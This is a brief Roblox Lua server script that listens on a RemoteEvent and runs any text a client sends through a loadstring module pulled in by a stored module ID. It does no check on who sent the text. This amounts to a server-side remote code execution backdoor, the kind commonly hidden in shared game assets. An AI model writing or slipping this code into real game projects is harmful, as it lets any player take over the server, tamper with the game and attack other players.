wait(2)
script.Parent.exRemoteEvent.OnServerEvent:Connect(function(s,text)
	local loadstring = require(script.stringload.Value) -- Module path
	loadstring(text)()
end)
